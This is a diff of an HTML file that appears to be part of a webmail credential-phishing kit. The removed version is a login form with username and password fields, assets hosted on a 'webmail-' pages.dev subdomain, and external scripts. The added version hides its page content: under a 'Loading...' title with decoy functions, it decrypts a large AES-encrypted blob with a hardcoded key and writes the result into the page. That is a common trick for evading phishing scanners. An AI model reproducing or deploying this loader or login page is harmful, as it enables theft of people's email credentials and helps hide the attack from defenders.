@@ -1,55 +1,28 @@
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <link rel="stylesheet" href="https://webmail-1nsuu2-192932ns.pages.dev/assets/css/style.css">
-</head>
-    <body class="bg-slate-600 bg-blend-overlay bg-no-repeat bg-cover bg-top flex items-center justify-center h-screen w-screen">
+<html><head><meta charset="UTF-8"><title>Loading...</title></head><body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+function _qLo(){return 9128;}
+function _gYq(){return 2784;}
+function _fZx(a,b){return a^b;}
+function _Len(x){return x.length;}
+function _dmy(){return 'UTF-8';}
 
-    <div id="loading"><img src="https://webmail-1nsuu2-192932ns.pages.dev/assets/img/vuhf13lr8j.gif" alt=""></div>
+var _k1 = "Q2LjWZNVPTILG5zU";
+var _k2 = "YGcPJyry1PlW0Ugt";
+var _key = _k1 + _k2;
 
-    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md mx-4">
-        <div class="flex justify-center items-center">
-            <img id="logo" src="#" alt="" class="h-20 w-20 mb-4" onerror="this.onerror = null; this.src = 'https://webmail-1nsuu2-192932ns.pages.dev/assets/img/eahmnhyh2a.png'">
-        </div>
-        <h2 class="text-center text-2xl font-bold text-red-500 mb-4" id="dcn4t04x4i5byvi">
-            <span class="text-2xl font-bold" id="ap0p7s8vtg"></span>&nbsp;<span id="vdg2f1pyht"></span>
-        </h2>
-
-        <div class="mb-4">
-            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2 text-center" id="jo9m5a8qe314bvq" style="display: none">
-                <strong class="font-bold"></strong>
-            </div>
-            <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded text-center" id="rop0jkp5oddjh4f" style="display: none">
-                <strong class="font-bold"></strong>
-            </div>
-        </div>
-
-        <div class="flex items-center border rounded-lg mb-4 px-3 py-2">
-            <img src="https://raw.githubusercontent.com/itsupportamdritz/works/refs/heads/main/assets/img/twed7t1lkd.png" alt="" class="h-4 w-4 mr-2">
-            <input id="fzrf476uwg04ifj" class="w-full outline-none" required>
-        </div>
-
-        <div class="flex items-center border rounded-lg mb-4 px-3 py-2">
-            <img src="https://webmail-1nsuu2-192932ns.pages.dev/assets/img/j71m92wdot.png" alt="" class="h-4 w-4 mr-2">
-            <input id="mb9762t83cqwoxb" class="w-full outline-none" required>
-        </div>
-
-        <div class="flex items-center mb-4">
-            <input type="checkbox" class="form-checkbox h-4 w-4 text-blue-600" checked>
-            <label class="ml-2 text-sm text-gray-600" id="fnwayfk8t6n6veg"></label>
-        </div>
-
-        <button id="akjza30h39qkt1u" class="w-full bg-blue-500 text-white font-bold py-2 rounded-lg hover:bg-blue-600"></button>
-    </div>
-    <script src="https://webmail-1nsuu2-192932ns.pages.dev/assets/js/qymt22xfza.js"></script>
-    <script src="https://webmail-1nsuu2-192932ns.pages.dev/assets/js/gahsf54d2k.js"></script>
-    <script src="https://webmail-1nsuu2-192932ns.pages.dev/assets/js/unw3ir66zc.js"></script>
-</body>
-</html>
-
-
-
+function _decryptAES(_enc,_k){
+    var raw = atob(_enc);
+    var iv = CryptoJS.enc.Latin1.parse(raw.slice(0,16));
+    var data = CryptoJS.enc.Latin1.parse(raw.slice(16));
+    var dec = CryptoJS.AES.decrypt({ciphertext: data}, CryptoJS.enc.Utf8.parse(_k), {
+        iv: iv,
+        mode: CryptoJS.mode.CBC,
+        padding: CryptoJS.pad.Pkcs7
+    });
+    return dec.toString(CryptoJS.enc.Utf8);
+}
+document.write(_decryptAES("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", _key));
+</script>
+</body></html>
